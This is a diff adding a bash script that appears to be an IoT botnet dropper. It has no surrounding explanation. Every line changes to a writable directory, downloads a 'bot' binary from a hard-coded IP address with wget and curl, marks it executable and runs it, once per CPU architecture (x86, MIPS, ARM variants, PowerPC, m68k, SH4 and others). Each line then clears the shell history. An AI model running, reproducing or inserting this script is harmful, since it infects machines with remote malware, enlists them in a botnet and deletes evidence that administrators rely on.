@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.x86; curl -O http://193.228.91.110/bot.x86;cat bot.x86 >botsh;chmod +x *;./botsh x86; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.mips; curl -O http://193.228.91.110/bot.mips;cat bot.mips >botsh;chmod +x *;./botsh mips; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.mipsel; curl -O http://193.228.91.110/bot.mipsel;cat bot.mipsel >botsh;chmod +x *;./botsh mipsel; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.arm; curl -O http://193.228.91.110/bot.arm;cat bot.arm >botsh;chmod +x *;./botsh arm; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.arm5; curl -O http://193.228.91.110/bot.arm5;cat bot.arm5 >botsh;chmod +x *;./botsh arm5; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.arm6; curl -O http://193.228.91.110/bot.arm6;cat bot.arm6 >botsh;chmod +x *;./botsh arm6; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.arm7; curl -O http://193.228.91.110/bot.arm7;cat bot.arm7 >botsh;chmod +x *;./botsh arm7; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.ppc; curl -O http://193.228.91.110/bot.ppc;cat bot.ppc >botsh;chmod +x *;./botsh ppc; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.m68k; curl -O http://193.228.91.110/bot.m68k;cat bot.m68k >botsh;chmod +x *;./botsh m68k; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.i586; curl -O http://193.228.91.110/bot.i586;cat bot.i586 >botsh;chmod +x *;./botsh i586; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.i686; curl -O http://193.228.91.110/bot.i686;cat bot.i686 >botsh;chmod +x *;./botsh i686; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.spc; curl -O http://193.228.91.110/bot.spc;cat bot.spc >botsh;chmod +x *;./botsh spc; history -c; rm -rf ~/.bash_history
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.228.91.110/bot.sh4; curl -O http://193.228.91.110/bot.sh4;cat bot.sh4 >botsh;chmod +x *;./botsh sh4; history -c; rm -rf ~/.bash_history
